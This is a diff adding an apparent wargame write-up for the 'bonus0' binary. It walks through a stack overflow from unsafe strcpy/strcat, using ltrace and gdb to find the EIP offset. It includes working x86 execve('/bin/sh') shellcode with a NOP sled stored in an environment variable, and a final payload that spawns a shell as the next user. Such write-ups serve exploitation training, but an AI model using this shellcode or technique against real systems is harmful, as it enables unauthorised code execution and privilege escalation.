@@ -1,1 +1,35 @@
+Testing the './bonus0', we see that there is 2 'fgets' calls in stdin, then there is a concatenation of the  strings separated by ' ' 
+then it prints the results.
+
+Let's verify it with 'ltrace'.
+
+We see that our guess was almost ccorect except that it calls 'read' this time.
+We see that it reads 4096 chars each time. So we might be able to use that later on.
+
+There is also one call to 'strcpy' which isn't safe, so we will probably exploit this.
+
+Let's break te disassembly code in gdb.
+
+We first see that there is a function 'pp' that calls 'p' twice (which reads, search for '\n' and stores the string given) 
+	then it calls 'strcpy' then 'strcat' and then the main 'puts' the result.
+
+We will try to completely fill both reads to find a offset to overflow.
+
+(python -c 'print "A" * 4095 + "\n" + "B" * 4095 + "\n"') | ./bonus0
+
+We got our segmentation fault, testing it in gdb, we see that it's the second buffer that rewrites EIP.
+
+Using (python -c 'print "A" * 4095 + "\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL" + "M" * 500 + "\n"') | ./bonus0
+We found that the segfault happens at 0x44434343 so we have our offset after the first 'C'.
+
+Because the strncpy keeps only 20 chars, we can't write our shellcode there so we will add it to our env.
+
+For example: export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
+(We added multiple '\x90'(instruction thaat does nothing) to avoid the 'SHELLCODE=' at the  start of the env variable)
+
+Now we get our new env address with gdb( x/20s ((char **)*environ) ).
+
+example:
 (python -c 'print "A" * 4095 + "\n" + "AAAABBBBC\x6e\xfe\xff\xbf" + "A" * 50'; cat) | ./bonus0
+
+Finally we have a shell with bonus1
